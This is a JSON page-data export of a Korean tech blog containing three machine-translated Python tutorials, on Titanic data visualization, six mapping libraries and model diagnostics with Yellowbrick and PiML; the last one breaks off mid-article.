{"pageProps":{"posts":[{"title":"파이썬에서 데이터 시각화 기술과 코드 예제","description":"","date":"2024-05-20 18:34","slug":"2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples","content":"\n\n데이터 시각화는 데이터에서 통찰을 얻고 전달하는 데 강력한 도구입니다. 이 기사에서는 Python을 사용하여 타이타닉 데이터셋을 중심으로 다양한 데이터 시각화 기법을 탐색하겠습니다. Matplotlib 및 Seaborn과 같은 인기있는 라이브러리를 사용하여 유의미한 시각화를 만들 것입니다. 추가적으로, 모든 플롯에는 시각적 명확성과 일관성을 높이기 위해 빨간색을 사용할 것입니다.\n\n![image](/assets/img/2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples_0.png)\n\n## 데이터셋 소개\n\n타이타닉 데이터셋은 다양한 데이터 분석 및 기계 학습 작업에 사용되는 고전적인 데이터셋입니다. 타이타닉호 승객에 대한 정보를 포함하며 그들의 인구 통계, 티켓 등급, 요금 및 생존 상태에 대한 정보가 포함되어 있습니다. 타이타닉 데이터셋을 로드하고 구조를 간단히 살펴보겠습니다:\n\n<div class=\"content-ad\"></div>\n\n```python\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn as sns\n\n# 타이타닉 데이터셋 불러오기\ntitanic = sns.load_dataset('titanic')\n```\n\n# 1. 숫자 변수에 대한 히스토그램\n\n히스토그램은 숫자 변수의 분포를 시각화하는 데 유용합니다. 나이와 요금에 대한 히스토그램을 그려보겠습니다:\n\n```python\n# 나이에 대한 히스토그램 그리기\nplt.figure(figsize=(8, 6))\nsns.histplot(titanic['age'].dropna(), bins=30, kde=True, color='red')\nplt.title('나이 분포')\nplt.xlabel('나이')\nplt.ylabel('빈도')\nplt.show()\n```\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples_1.png\" />\n\n```js\n# 요금에 대한 히스토그램 작성\nplt.figure(figsize=(8, 6))\nsns.histplot(titanic['fare'], bins=30, kde=True, color='blue')\nplt.title('요금 분포')\nplt.xlabel('요금')\nplt.ylabel('빈도')\nplt.show()\n```\n\n<img src=\"/assets/img/2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples_2.png\" />\n\n히스토그램을 통해 승객들의 나이와 요금 분포에 대한 통찰을 얻을 수 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n# 2. 범주형 변수에 대한 막대 플롯\n\n막대 플롯은 범주형 변수의 분포를 시각화하는 데 효과적입니다. 탑승객 클래스와 생존 상태에 대한 막대 플롯을 그려보겠습니다:\n\n```js\n# 승객 클래스에 대한 막대 플롯 그리기\nplt.figure(figsize=(6, 4))\nsns.countplot(x='class', data=titanic, color='red')\nplt.title('승객 클래스 분포')\nplt.xlabel('클래스')\nplt.ylabel('수')\nplt.show()\n```\n\n<img src=\"/assets/img/2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples_3.png\" />\n\n<div class=\"content-ad\"></div>\n\n```md\n# 생존 상태에 대한 막대 그래프 플롯하기\nplt.figure(figsize=(8, 6))\nsns.countplot(x='survived', data=titanic, color='red')\nplt.title('생존 상태 분포')\nplt.xlabel('생존 상태')\nplt.ylabel('카운트')\nplt.show()\n```\n\n![이미지](/assets/img/2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples_4.png)\n\n막대 그래프는 승객들이 다른 클래스 및 생존 상태에 분포된 정보를 제공합니다.\n\n# 3. 아웃라이어 감지를 위한 상자 그림(Box Plot)\n\n\n<div class=\"content-ad\"></div>\n\n상자 수염 도표는 이상치를 감지하고 숫자 변수의 분포를 시각화하는 데 유용합니다. 나이와 요금에 대한 상자 수염 도표를 그려보겠습니다:\n\n```js\n# 나이에 대한 상자 수염 도표 그리기\nplt.figure(figsize=(8, 6))\nsns.boxplot(x='age', data=titanic, color='red')\nplt.title('나이 분포 (상자 수염 도표)')\nplt.xlabel('나이')\nplt.show()\n```\n\n<img src=\"/assets/img/2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples_5.png\" />\n\n```js\n# 요금에 대한 상자 수염 도표 그리기\nplt.figure(figsize=(8, 6))\nsns.boxplot(x='fare', data=titanic, color='green')\nplt.title('요금 분포 (상자 수염 도표)')\nplt.xlabel('요금')\nplt.show()\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Box plots](/assets/img/2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples_6.png)\n\nBox plots는 이상값을 식별하고 연령 및 요금의 분포를 이해하는 데 도움이 됩니다.\n\n# 결론\n\n데이터 시각화는 데이터로부터 통찰력을 얻고 발견한 결과를 효과적으로 전달하는 데 중요합니다. 이 기사에서는 Matplotlib 및 Seaborn과 같은 Python 라이브러리를 사용하여 다양한 데이터 시각화 기술을 살펴보았습니다. 숫자형 및 범주형 변수의 분포를 시각화하고 이상값을 감지하며 Titanic 데이터셋에 대한 통찰력을 얻었습니다. 모든 플롯에 대해 빨간색을 사용함으로써 시각적 명확성과 시각화의 일관성을 보장했습니다.\n\n\n<div class=\"content-ad\"></div>\n\n복잡한 데이터셋을 이해하고 정보를 얻기 위해서는 효과적인 데이터 시각화가 필수적입니다. 데이터에서 숨겨진 패턴과 관계를 발견하기 위해 다양한 시각화 기술을 실험해보세요.\n\n향후 기사에서는 고급 시각화 기술에 대해 더 깊이 파고들고 더 복잡한 데이터셋을 탐색할 것입니다. 더 많은 통찰력 있는 콘텐츠를 기대해 주세요!\n\n# Python Fundamentals\n\n소중한 시간과 관심에 감사드립니다! 🚀\nPython Fundamentals에서 더 많은 콘텐츠를 찾아보실 수 있습니다. 💫","ogImage":{"url":"/assets/img/2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples_0.png"},"coverImage":"/assets/img/2024-05-20-DataVisualizationTechniquesinPythonwithCodeExamples_0.png","tag":["Tech"],"readingTime":4},{"title":"아름다운 지도를 만들기 위한 6가지 파이썬 라이브러리","description":"","date":"2024-05-20 18:32","slug":"2024-05-20-6pythonlibrariestomakebeautifulmaps","content":"\n\n\n![image](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_0.png)\n\n어느 순간 모든 데이터 과학자는 지리 공간 데이터를 분석하거나 모델링할 필요에 직면하게 되며, 결정적인 시각적 부분 없이는 수행할 수 없습니다. 저는 지도를 좋아하는 사람이라서, 여기에서 정보를 제공하게 된 이 6가지 멋진 라이브러리를 공유해 주어 기쁩니다. 여기에서 공유하는 라이브러리들 중 일부는 정적 시각화에 더 적합하고, 다른 것들은 대화식 시각화에 더 적합하기 때문에 해결할 수 있는 문제 범위가 넓습니다.\n\n# 1. Cartopy\n\n![image](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_1.png)\n\n\n<div class=\"content-ad\"></div>\n\nCartopy는 스칼라 또는 폴리곤 데이터를 사용하여 정적 지도를 그리는 데 완벽한 강력한 잘 알려진 라이브러리입니다. 땅, 물 및 행정 국경에 많은 내장된 레이어를 제공합니다. 매우 쉽게 사용할 수 있으며 직관적인 명령어 세트가 있습니다.\n\n예를 들어, MODIS 데이터를 시각화해 보겠습니다. 함께 따라오고 싶다면 코드를 여기에서 찾을 수 있습니다.\n\n패키지를 설치하려면 다음과 같이 pip로 정규 표현식을 사용할 수 있습니다:\n\n```js\n!pip install cartopy\n```\n\n<div class=\"content-ad\"></div>\n\n이제 데이터를 로드해 봅시다:\n\n```js\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nlats = np.load('lats.npy')\nlons = np.load('lons.npy')\ndata = np.load('data.npy')\n```\n\n그 후에 데이터를 바로 플롯할 수 있어요:\n\n```js\nproj = ccrs.PlateCarree() #지도 투영을 설정해 봅시다\n\nfig, ax = plt.subplots(subplot_kw=dict(projection=proj), figsize=(10, 20))#미리 설정한 투영과 크기를 가진 figure를 생성해야 해요\n\nax.set_extent([-160, -105, 40 ,70], crs=ccrs.PlateCarree())#MODIS 제품 지역만 포함하도록 좌표를 제한합시다\n\nplt.contourf(lons, lats, data,\n             transform=ccrs.PlateCarree(), cmap = 'summer') #matplotlib을 사용하여 데이터의 등고선을 추가합시다\n'''좋은 cartopy 기능 추가하기'''\nax.add_feature(cfeature.BORDERS, edgecolor='black', linewidth=1) \nax.add_feature(cfeature.LAKES,  alpha=0.5)\nax.add_feature(cfeature.LAND)\nax.add_feature(cfeature.COASTLINE, edgecolor='black', linewidth=1)\nax.add_feature(cartopy.feature.RIVERS, edgecolor='blue', linewidth=0.5)\nstates_provinces = cfeature.NaturalEarthFeature(\n            category='cultural',  name='admin_1_states_provinces',\n            scale='10m', facecolor='none')\nax.add_feature(states_provinces, edgecolor='black', zorder=10, linestyle = '-', linewidth=0.5)\n\n\nax.gridlines(draw_labels=True)#그리드 형식 지정\n\nlon, lat = -122.8414, 55.1119 \nax.plot(lon,lat,  'bo', markersize=6, color = 'red', transform=ccrs.Geodetic())#지도에 임의의 마커 추가하기\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Image 1](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_2.png)\n\n위 결과에서 알 수 있듯이, cartopy는 맵을 사용자 정의하는 다양한 방법을 제공합니다. 색상, 선 두께, 밀도 및 레이어의 다른 매개변수를 수동으로 설정할 수 있습니다. 게다가 코드 자체가 정말 직관적이고 이해하기 쉽습니다.\n\n이 라이브러리의 또 다른 큰 장점은 사용할 수 있는 다양한 투영법들인데, cartopy를 사용하여 시각화할 수 있는 데이터 범위가 매우 넓습니다!\n\n![Image 2](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_3.png)\n\n\n<div class=\"content-ad\"></div>\n\n\n![Python libraries to make beautiful maps](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_4.png)\n\nCartopy is one of the tools I regularly use in my work, and I hope that you’ll find it extremely helpful as well!\n\n## 2. Folium\n\nThis library is probably the most popular in the industry, since it’s interactive (it has JS under the hood) and highly customizable. And to start plotting (after installation) you can simply call:\n\n\n<div class=\"content-ad\"></div>\n\n```md\nimport folium\nmap = folium.Map(location=(50, 0), zoom_start=8) # 위치 - 맵의 중앙, 확대 수준 - 해상도\nmap\n```\n\n![이미지](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_5.png)\n\n다른 기본 타일 또는 사용자 정의 타일을 사용할 수 있습니다:\n\n```md\nmap = folium.Map(location=(50, 0), zoom_start=8, tiles=\"Cartodb Positron\")\nmap\n```\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_6.png)\n\n이제 세계 국가들을 추가해보겠습니다. 그러려면 기본 geopandas 데이터프레임을 사용할 거에요:\n\n```python\nimport geopandas as gpd\ndf = gpd.read_file(gpd.datasets.get_path('naturalearth_lowres'))\n\nmap = folium.Map(zoom_start=4, tiles=\"Cartodb Positron\")\ngdf_json = df.to_json()\n\nfolium.GeoJson(gdf_json).add_to(map)\nmap\n```\n\n![image](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_7.png)\n\n\n<div class=\"content-ad\"></div>\n\n# 3. Plotly\n\nPlotly는 아름다운 대화형 차트로 유명한 또 다른 라이브러리입니다. 다양한 기능 중에는 px.choropleth, px.choropleth_mapbox, px.scatter_mapbox, px.scatter_geo 등의 지도를 그리는 여러 함수가 있습니다. 더 자세한 내용은 [여기](https://plotly.com/python/)에서 확인할 수 있습니다.\n\n실제로 같은 지리 데이터셋을 사용하여 gdp_md_est 변수를 시각화해 보겠습니다. 다음 코드 몇 줄로 쉽게 수행할 수 있습니다:\n\n```python\nimport plotly.express as px\n\nfig = px.choropleth(df, locations='iso_a3', hover_name='name', \n                    color='gdp_md_est',\n                    projection='natural earth')\nfig.show()\n```\n\n<div class=\"content-ad\"></div>\n\n\n![image](https://miro.medium.com/v2/resize:fit:1400/1*XGb8bY8LL26sKv2Wmkb-AQ.gif)\n\n# 4. ipyleaflet\n\n네 소개할 라이브러리는 'ipyleaflet'입니다. 이것은 상호작용형 지도를 만들기 위한 또 다른 훌륭한 JS 기반 라이브러리입니다. 이 패키지가 좋은 이유 중 하나는 타일의 종류가 많다는 것이에요. 그러니 기본적인 것부터 시작해봅시다:\n\n```js\nfrom ipyleaflet import Map\n\nm = Map(center=(45, 2), zoom=5)\nm\n```\n\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_8.png)\n\n별 거 없죠? 그럼 이제 MODIS Terra 제품을 배경지도로 사용해 봅시다!\n\n```js\nm = Map(basemap=basemap_to_tiles(basemaps.NASAGIBS.ModisTerraTrueColorCR, \"2023-08-08\"),\n    center=(45, 2), zoom=5)\nm\n```\n\n![image](/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_9.png)\n\n\n<div class=\"content-ad\"></div>\n\nVIIRS 데이터를 사용하여 밤에 지구를 시각화할 수도 있어요:\n\n```js\nm = Map(basemap=basemaps.NASAGIBS.ViirsEarthAtNight2012,\n    center=(45, 2), zoom=5)\nm\n```\n\n<img src=\"/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_10.png\" />\n\n다른 옵션들도 함께 살펴보세요! 옵션이 많이 있답니다.\n\n<div class=\"content-ad\"></div>\n\n이제 실제 데이터를 시각화해 봅시다. 발견한 라이브러리 중 가장 인상적인 기능 중 하나는 속도 시각화입니다. 이를 위해 1° 해상도를 가진 NCEP(WMC) 예측 데이터를 사용할 수 있습니다. 해당 데이터셋은 2016년 4월 30일 06:00에 가져와졌고, ipyleaflet 라이브러리의 문서에서 제공되었습니다. 이를 읽기 위해 netCDF4 파일을 읽는 데 적합한 xarray를 사용할 것입니다.\n\n```js\nfrom ipyleaflet.velocity import Velocity\nimport xarray as xr\nimport os\nimport requests\n\nif not os.path.exists('wind-global.nc'):\n  url = 'https://github.com/benbovy/xvelmap/raw/master/notebooks/wind-global.nc'\n  r = requests.get(url)\n  wind_data = r.content\n  with open('wind-global.nc', 'wb') as f:\n      f.write(wind_data)\n\nm = Map(center=(45, 2), zoom=4, interpolation='nearest', basemap=basemaps.CartoDB.DarkMatter)\n\nds = xr.open_dataset('wind-global.nc')\n\nwind = Velocity(data=ds,\n                zonal_speed='u_wind',\n                meridional_speed='v_wind',\n                latitude_dimension='lat',\n                longitude_dimension='lon',\n                velocity_scale=0.01,\n                max_velocity=20)\nm.add(wind)\n\nm\n```\n\n<img src=\"https://miro.medium.com/v2/resize:fit:1400/1*ImNN4p5UxlISf-p22XbGGQ.gif\" />\n\n보시다시피 결과물은 단순히 상호작용형 지도가 아니라 애니메이션 지도입니다. 그렇기 때문에 데이터의 표현력을 향상시키고 데이터가 말하도록 만들어 줍니다!\n\n<div class=\"content-ad\"></div>\n\n# 5. geemap\n\nGeemap은 Google Earth Engine과 통합된 대화식 맵핑을 위한 패키지입니다. 따라서 Python GEE 패키지인 ee 라이브러리와 함께 사용할 때 매우 편리합니다.\n\n데모로 북유럽 한 섬에서 Dynamic World 제품의 토지 피복 데이터를 수집해 보겠습니다:\n\n```js\nimport ee\n\n반지름 = 1250\n지점 = ee.Geometry.Point([19.9, 60.2])\nroi = 지점.buffer(반지름) # 관심 지점 주변에 원 만들기\n\nDW = ee.ImageCollection(\"GOOGLE/DYNAMICWORLD/V1\")\\\n                  .filterDate(start = '2022-07-08', end='2022-08-30')\\\n                  .filterBounds(roi) # 데이터 가져오기\nDW_list = DW.toList(DW.size()) # 데이터를 GEE 리스트로 변환\n```\n\n<div class=\"content-ad\"></div>\n\n이제 그래픽 플로팅을 할 수 있어요:\n\n```js\nm = geemap.Map(center=[60.2, 19.9], zoom=14)\n\nm.add_basemap('HYBRID') # Sentinel-2 이미지 레이어를 추가하고 있어요\nviz_params = {'bands':'label', 'min':0, 'max':8,\n'palette':['419bdf',\n    '397d49',\n    '88b053',\n    '7a87c6',\n    'e49635',\n    'dfc35a',\n    'c4281b',\n    'a59b8f',\n    'b39fe1']}\nm.add_ee_layer(ee.Image(DW_list.get(9)), viz_params) # 구름 커버리지가 낮은 이미지 №9를 추가하였어요\nm.add_legend(title=\"Dynamic World Land Cover\", builtin_legend='Dynamic_World')\ndisplay(m)\n```\n\n<img src=\"https://miro.medium.com/v2/resize:fit:1400/1*Rj0DI3lXmhlSdmRK7IiRKg.gif\" />\n\ngeemap은 GEE와 함께 사용하기 훌륭한 도구라고 생각해요. 다양한 기능을 제공하여 다양한 작업을 해결할 수 있어요. 주요하고 유일한 단점은 사용자 친화적이지 않다는 점이에요. geemap을 사용하기 전에 ee 라이브러리 문법을 알아야 하고, GEE가 어떻게 작동하는지 일반적으로 이해해야 해요.\n\n<div class=\"content-ad\"></div>\n\n# 6. ridgemap\n\n이 라이브러리는 마지막이자 정말로 제가 가장 좋아하는 라이브러리입니다. 왜냐하면 이 라이브러리를 사용하면 예술작품 같은 독특한 플롯을 만들 수 있기 때문이죠.\n\n그래프를 그리기 전에 두 라이브러리를 설치해보겠습니다:\n\n```js\n!pip install ridge_map mplcyberpunk\n```\n\n<div class=\"content-ad\"></div>\n\n이제 맵을 만들어 봅시다:\n\n```js\nimport matplotlib.pyplot as plt\nfrom ridge_map import FontManager, RidgeMap\nimport ridge_map as rm\nimport mplcyberpunk\nimport matplotlib.font_manager as fm\n\nplt.style.use(\"cyberpunk\")\nplt.rcParams[\"figure.figsize\"] = (16,9)\n\nfm = FontManager('https://github.com/google/fonts/blob/main/ofl/arbutusslab/ArbutusSlab-Regular.ttf?raw=true')\n\nr = RidgeMap(bbox=(-15, 32, 45,90), font=fm.prop) # 맵 생성\n\nvalues = r.get_elevation_data(num_lines=200) # 고도 데이터 가져오기\nvalues = r.preprocess(values=values, # 하이퍼파라미터 설정\n   water_ntile=70,\n   vertical_ratio=40,\n   lake_flatness=3)\n\nr.plot_map(values, label=\"Europe\", label_x=0.4,label_y=-0.05, label_size=60, line_color=plt.get_cmap('inferno'), background_color=\"#212946\")\nmplcyberpunk.add_glow_effects() # 빛나는 효과 추가\n```\n\n<img src=\"/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_11.png\" />\n\n내 의견으로는 이것이 정말 멋지네요! 이 라이브러리를 확인하고 다른 시각화를 찾아보고 자신만의 시각화를 올려보세요 :)\n\n<div class=\"content-ad\"></div>\n\n나중에 이 라이브러리들이 유용하고 당신의 도구상자에 포함할 가치가 있다고 느끼길 바랍니다.\n\n지도를 만드는 데 사용하는 라이브러리는 무엇인가요? 댓글로 공유해주세요👇\n\n===========================================\n\n부. (지리)데이터 과학, 머신러닝/인공지능, 기후 변화에 열정적입니다. 그래서 어떤 프로젝트에서 함께 일하고 싶다면 여기나 LinkedIn에서 연락주세요.\n\n<div class=\"content-ad\"></div>\n\n더 많은 내용을 보려면 팔로우해주세요! 🚀🌌","ogImage":{"url":"/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_0.png"},"coverImage":"/assets/img/2024-05-20-6pythonlibrariestomakebeautifulmaps_0.png","tag":["Tech"],"readingTime":10},{"title":"파이썬 패키지 Yellowbrick와 PiML으로 소중한 데이터와 모델 통찰력 발견하기 코드 포함","description":"","date":"2024-05-20 18:29","slug":"2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode","content":"\n\n<img src=\"/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_0.png\" />\n\n안녕하세요! 이 기사에서는 Yellowbrick와 PiML의 Python 패키지가 데이터 전문가가 데이터와 모델을 더 잘 이해할 수 있도록 도와주는 방법을 탐구할 것입니다. 다양한 데이터 및 모델 품질 문제에 대처하고 있습니다. LLM들의 시대에 여전히 중요한 이유들은 다음과 같습니다: (a) 데이터와 모델에 대한 강력한 시각적 통찰을 제공한다, (b) 모델 성능 분석 영역에서 교육 도구로 사용될 수 있다, (c) 비용과 자원 측면에서 효율적이며, (d) 데이터 프라이버시를 제공한다. 모든 교육 및 시각화는 데이터를 클라우드 기반 서버로 이전하지 않고도 내부에서 이뤄질 수 있습니다.\n\n다음은 토론할 주제들입니다:\n\n- 분류 작업에 충분한 훈련 데이터 크기인지\n- 특정 매개변수 튜닝이 분류 성능에 어떻게 영향을 주는지 시각화\n- 군집 알고리즘 성능을 클러스터 중첩 및 클러스터 거리 측면에서 시각화. 클래스 간 특징 분포 시각화.\n- 다섯 가지 다른 측정 방법을 사용한 모델 성능 비교\n- 전역 및 지역 해석가능성\n- 모델의 약한 조각 식별\n- 모델 신뢰성 분석\n- 모델 견고성 분석\n- 모델 분할 진단 분석\n\n<div class=\"content-ad\"></div>\n\n# A. 옐로브릭\n\n## A.1 분류\n\n옐로브릭의 기능을 탐색하기 위해 잘 알려진 공개 데이터 세트 와인을 사용할 것입니다. 이 데이터 세트는 178개의 행과 13개의 열로 구성되어 있습니다. 특징은 '색상 강도', '알콜', '말산 산' 등의 다양한 와인 특성입니다. 목표 변수는 0, 1, 2로 표시된 3가지 와인 클래스로 구성되어 있습니다. 먼저 와인 데이터 세트를 사용하여 분류를 수행할 것입니다. RandomForestClassifier를 사용하여 다음과 같은 결과를 얻을 것입니다.\n\n분류 정확도가 0.97인 것을 볼 수 있습니다. 이는 높은 수준의 정확도를 나타냅니다.\n\n<div class=\"content-ad\"></div>\n\nA.1.1 학습 데이터 양 충분성\n\nYellowbrick를 사용하여 모델의 학습 곡선을 플로팅하여 학습 데이터 양 충분성 문제를 해결할 것입니다. 이 곡선은 그림 1에 나타나 있습니다. 학습 곡선은 모델이 학습 데이터 양을 증가시킬 때 모델의 성능이 어떻게 변하는지 시각화합니다. 학습 곡선을 통해 우리는 다음을 이해할 수 있습니다:\n\n- 더 많은 데이터를 추가하면 모델의 일반화 능력이 향상될 수 있는지 여부.\n- 과적합/과소적합이 있는지 여부. 이는 학습 및 검증 점수가 수렴하는 방식에 따라 달라집니다.\n\n<div class=\"content-ad\"></div>\n\n학습曲선은 다음을 보여줍니다:\n\n- 훈련 점수는 모든 훈련 인스턴스에 대해 1.0에 가까운 높은 값을 유지합니다. 이는 RandomForest 모델이 훈련 데이터로부터 효과적으로 학습하는 것을 시사합니다.\n- Figure 1의 교차 검증 점수 라인을 살펴보면, 교차 검증 점수가 일정하지 않고 훈련 점수보다 낮게 시작하는 것을 볼 수 있습니다. 훈련 인스턴스 수가 증가함에 따라 일부 변동성을 보이다가 결국 훈련 점수보다 아래 수준에 안정화됩니다. 훈련과 교차 검증 사이에 뚜렷한 차이가 있으며, 이는 과적합의 지표입니다. 일반화를 향상시키기 위해 과적합을 줄이는 정규화와 같은 개선이 필요합니다.\n- 더 많은 데이터가 필요한가요? 아마도 그렇지 않습니다. 교차 검증 점수는 안정화되어 특정 훈련 인스턴스 수 이상(약 70~80)으로 진전이 없어 보입니다. 이는 더 많은 데이터를 추가해도 새로운, 보이지 않는 데이터에 대한 모델 성능이 크게 향상되지 않을 수도 있다는 것을 시사합니다.\n\nA.1.2. 특정 매개변수 조정이 분류 성능에 미치는 영향\n\n아래 코드 스니펫에서 RandomForest 분류기의 최대 트리 깊이는 값 1부터 11까지 변화합니다. 그런 다음 'max_depth' (최대 트리 깊이)가 변하는 것을 추적할 수 있도록 모델 성능 변화를 보여주는 검증 곡선 시각화기가 생성됩니다.\n\n<div class=\"content-ad\"></div>\n\n![Unlocking Valuable Data and Model Insights with Python Packages Yellowbrick and PiML with Code](/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_2.png)\n\n그림 2는 검증 곡선을 보여줍니다. 일반적으로 검증 곡선은 기계 학습에서 모델이 어떻게 수많은 하이퍼파라미터 값 범위에서 수행되는지를 평가하는 데 사용됩니다. 이 곡선은 하이퍼파라미터의 최적값을 찾는 데 도움을 주며, 그 곳은 검증 점수가 최대화되고, 훈련 및 검증 점수의 갭이 합리적인 곳입니다. 이는 우리 모델이 잘 일반화될 수 있다는 것을 의미합니다.\n\n교차 검증 점수가 'max_depth'=7에서 최대치를 보입니다. 그림 2의 이 관찰은 'max_depth'가 7로 설정할 때, 모델이 데이터에서 충분한 복잡성을 캡처하고 새로운 데이터로 일반화하기 위한 최상의 균형을 제공한다는 것을 시사합니다. 다시 말해, 이는 모델이 의미 있는 패턴을 학습하면서 너무 많은 잡음에 과적합 되지 않는 깊이입니다. 이러한 매개변수 설정으로 인해 우리는 과적합을 피하면서도 정확한 예측을 수행할만큼 충분한 세부 정보를 캡처할 수 있습니다. 매개변수 값을 7 이상으로 증가시키면 과적합으로 이어질 수 있으며, 이는 검증 점수의 플래토 또는 약간의 감소로 나타납니다.\n\n## A.2 클러스터링\n\n<div class=\"content-ad\"></div>\n\n다음으로 와인 데이터에 K-Means 클러스터링 방법을 적용하고 알고리즘 성능을 시각적으로 확인하기 위해 Yellowbrick을 활용할 것입니다. 그러나 그 전에, 볼 수 있는 게 드물지만 유용한 Yellowbrick 그래프를 사용할 것입니다. 이는 와인의 특성 분포에 관한 것입니다(도표 3). 세 가지 클래스에 대한 대부분의 특성이 서로 겹치는 것을 볼 수 있지만, '알콜'과 '프로린' 등 일부 주목할 만한 차이점이 있습니다. Shapley 분석에서도 이 두 가지 특성이 중요한지 확인하는 것이 흥미로울 것입니다.\n\n<img src=\"/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_3.png\" />\n\n실제로, 아래의 도표 4에서 '알콜'과 '프로린'이 가장 중요한 세 가지 특성 중에 속합니다.\n\n<img src=\"/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_4.png\" />\n\n<div class=\"content-ad\"></div>\n\n아래는 클러스터링 알고리즘의 결과입니다. 아래의 내용을 보면, 클래스 1과 2에서 4개의 샘플이 잘못 분류되었지만, 전반적으로 결과는 좋습니다.\n\nYellowbrick의 도움을 받아 PCA 도메인에서 클러스터를 시각화할 것입니다. PCA 도메인에서 왜 하는지 궁금할 수 있습니다. PCA의 맥락에서 클러스터는 첫 번째 몇 개의 주요 구성 요소에 의해 정의된 공간에서 데이터 지점으로 표시됩니다. PCA는 데이터를 직교 방향으로 프로젝션하므로 원래 공간에서 겹치는 특징을 종종 분리할 수 있습니다. 와인 데이터에 대한 우리의 클러스터는 그림 5에 표시되어 있으며, 잘 분리되어 보입니다.\n\n마지막으로, Yellowbrick의 다차원 스케일링(MDS)을 사용하여 클러스터 간 거리를 시각화할 것입니다. MDS는 데이터 세트의 개별 데이터 지점의 유사성을 시각화하는 데 중점을 둡니다. 유사성 또는 상이성을 보존하므로 클러스터 간 거리를 시각화하는 데 적합한 도구입니다. 그림 6에서 세 클러스터 간에 큰 거리가 있음을 볼 수 있으며, PCA 도메인에서 명확한 클래스 분리와 일치합니다. 왼쪽 하단의 파선 원은 각 클래스에 속한 샘플 수를 나타냅니다(34: 클래스 0, 44: 클래스 1, 41: 클래스 2).\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_6.png\" />\n\n# B. PiML\n\n## B.1 데이터 및 준비 단계\n\nYellowbrick가 아름다운 시각화로 사용자를 기쁘게 하듯이, PiML은 EDA부터 모델 강건성 및 신뢰성 분석, 그리고 약한 조각 식별까지 다양한 기능으로 인상을 주는 것입니다. 그러나 PiML의 기능을 논의하기 전에, 분석에 사용할 데이터 세트에 대해 알아보겠습니다. UCI Machine Learning Laboratory의 Adult 데이터 세트 또는 Census Income 데이터 세트로 알려진 이 데이터는 수입을 분류하고 50K를 초과하는지 예측하는 데 사용될 수 있습니다. 이 데이터 세트에는 48842개의 인스턴스와 14가지 피처 및 대상 수입 변수가 포함되어 있습니다. 그 피처들의 일부를 아래에서 확인할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_7.png)\n\n많은 변수가 다양한 값을 갖는 범주형이기 때문에 일부 의미론적으로 유사한 값들을 병합하기 위해 feature engineering이 수행되었습니다. 우리는 [1]에서 설명된 feature engineering 예제를 따랐습니다. 'education' feature의 예시는 아래에 표시되어 있습니다.\n\nPiML은 사용자로부터 매우 적은 프로그래밍을 필요로 합니다. 모든 기능은 'Experiment' 객체를 통해 사용할 수 있습니다.\n\n한 줄로 된 코드 아래에서 PiML에서 EDA (탐색적 데이터 분석)를 하는 방법을 보여줍니다. 그리고 이것이 모든 PiML 기능에 접근하는 방법입니다: 한 줄로 된 명령어로.\n\n\n<div class=\"content-ad\"></div>\n\n아래 그림 7에서 나타나는 것처럼, PiML은 일변량 및 이변량 특성 분석을 수행하고 히트맵을 표시할 수 있습니다.\n\n![Figure 7](/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_8.png)\n\n- 어떤 분석을 수행하기 전에 대상 변수와 수행할 분석 유형(회귀 또는 분류)을 지정해야 합니다. 이 작업은 data_prepare() 모듈을 통해 수행됩니다.\n\n그림 8은 데이터 준비 모듈 화면을 보여줍니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_9.png\" />\n\n- 중요한 모델 훈련 단계입니다. 다양한 모델 중에서 선택할 수 있습니다. 아래 그림 9에서 볼 수 있듯이, 우리는 XGB1, XGB2, EBM(설명 가능한 부스팅 머신), 그리고 ReLU-DNN을 선택했습니다.\n\n<img src=\"/assets/img/2024-05-20-UnlockingValuableDataandModelInsightswithPythonPackagesYellowbrickandPiMLwithCode_10.png\" />\n\n## B.2 모델 분석\n\n<div class=\"content-ad\"></div>\n\nB.2.1 다섯 가지 숫자 측정치를 사용한 예측 성능 평가\n\nFigure 